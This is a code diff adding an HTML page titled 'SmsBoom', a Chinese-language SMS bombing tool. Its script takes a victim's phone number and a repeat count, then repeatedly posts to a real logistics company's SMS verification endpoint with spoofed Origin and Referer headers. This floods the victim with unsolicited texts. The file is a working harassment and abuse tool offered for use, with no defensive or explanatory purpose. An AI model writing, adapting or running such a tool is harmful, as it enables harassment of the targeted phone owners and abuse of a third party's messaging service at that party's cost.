@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SmsBoom</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #E0E0E0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .card {
+            background-color: #F5F5F5;
+            border-radius: 30px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+            padding: 24px;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #424242;
+            font-size: 16px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 18px;
+            font-size: 16px;
+            border: 2px solid #DDDDDD;
+            border-radius: 25px;
+            box-sizing: border-box;
+            color: #424242;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #757575;
+        }
+
+        .button-container {
+            margin-bottom: 24px;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 18px;
+            font-size: 18px;
+            color: #FFFFFF;
+            background-color: #757575;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-button:hover {
+            background-color: #616161;
+        }
+
+        .result-container {
+            height: 160px;
+            padding: 20px;
+            background-color: #FFFFFF;
+            border: 2px solid #DDDDDD;
+            border-radius: 25px;
+            overflow-y: auto;
+            color: #616161;
+            font-size: 15px;
+        }
+
+        .toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 4px;
+            padding: 16px;
+            position: fixed;
+            z-index: 1;
+            left: 50%;
+            bottom: 30px;
+            transform: translateX(-50%);
+        }
+
+        .toast.show {
+            visibility: visible;
+            animation: fadein 0.5s, fadeout 0.5s 2.5s;
+        }
+
+        @keyframes fadein {
+            from {bottom: 0; opacity: 0;}
+            to {bottom: 30px; opacity: 1;}
+        }
+
+        @keyframes fadeout {
+            from {bottom: 30px; opacity: 1;}
+            to {bottom: 0; opacity: 0;}
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+    <h2>Sms-Boom<h2>
+        <div class="input-group">
+            <label for="phoneNumber">输入手机号码</label>
+            <input type="tel" id="phoneNumber" placeholder="输入手机号码" maxlength="11">
+        </div>
+        <div class="input-group">
+            <label for="sendCount">发送次数</label>
+            <input type="number" id="sendCount" placeholder="发送次数" min="1">
+        </div>
+        <div class="button-container">
+            <button id="submitButton" class="submit-button">开始发送</button>
+        </div>
+        <div id="resultText" class="result-container">
+            运行状态将在这里显示
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        const submitButton = document.getElementById('submitButton');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const sendCountInput = document.getElementById('sendCount');
+        const resultText = document.getElementById('resultText');
+        const toast = document.getElementById('toast');
+
+        // 显示吐司消息
+        function showToast(message) {
+            toast.textContent = message;
+            toast.className = "toast show";
+            setTimeout(() => {
+                toast.className = toast.className.replace("show", "");
+            }, 3000);
+        }
+
+        // 发送短信函数
+        async function sendSms(phone) {
+            const url = "https://luxiwuliu.lxhg.com/Account/SendSMS";
+            const headers = {
+                "Host": "luxiwuliu.lxhg.com",
+                "Connection": "keep-alive",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2417A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.188 Mobile Safari/537.36",
+                "Accept": "*/*",
+                "Origin": "https://luxiwuliu.lxhg.com",
+                "Referer": "https://luxiwuliu.lxhg.com/Account/Login"
+            };
+
+            const data = new URLSearchParams({
+                phone: phone,
+                Type: 2,
+                LoginUserName: ""
+            });
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: headers,
+                    body: data
+                });
+                const body = await response.text();
+                return { code: response.status, body: body };
+            } catch (error) {
+                console.error("sendSms 错误:", error);
+                return { code: 0, body: null };
+            }
+        }
+
+        // 主逻辑
+        submitButton.addEventListener('click', async () => {
+            const phone = phoneNumberInput.value.trim();
+            const countStr = sendCountInput.value.trim();
+
+            console.log("提交按钮被点击");
+            console.log("输入的手机号:", phone);
+            console.log("输入的发送次数 (字符串):", countStr);
+
+            // 验证输入
+            if (phone.length !== 11) {
+                showToast("请输入11位手机号");
+                return;
+            }
+
+            if (countStr === "") {
+                showToast("发送次数不能为空");
+                return;
+            }
+
+            const countNum = Number(countStr);
+            if (isNaN(countNum)) {
+                showToast("发送次数必须是数字");
+                return;
+            }
+
+            if (countNum < 1) {
+                showToast("发送次数必须大于0");
+                return;
+            }
+
+            const loopCount = Math.floor(countNum);
+            console.log("发送次数 (数字):", loopCount, typeof loopCount);
+
+            // 开始发送
+            submitButton.disabled = true;
+            resultText.textContent = "开始发送...";
+
+            console.log(`开始发送短信到手机号: ${phone} 共 ${loopCount} 次`);
+
+            let success = 0;
+            let failed = 0;
+
+            for (let i = 1; i <= loopCount; i++) {
+                try {
+                    const { code, body } = await sendSms(phone);
+                    if (code === 200) {
+                        success += 1;
+                    } else {
+                        failed += 1;
+                    }
+
+                    const bodyStr = body || "无响应";
+
+                    console.log(`发送进度: ${i}/${loopCount}, 成功: ${success}, 失败: ${failed}, 最后响应: ${bodyStr}`);
+
+                    resultText.textContent = `发送进度: ${i}/${loopCount}\n成功: ${success}\n失败: ${failed}\n最后响应: ${bodyStr}`;
+
+                } catch (err) {
+                    failed += 1;
+                    console.error("发送错误：", err);
+                }
+
+                // 短暂延迟避免请求过快
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+
+            // 完成后启用按钮
+            submitButton.disabled = false;
+            showToast("发送完成");
+        });
+    </script>
+</body>
+    </html>
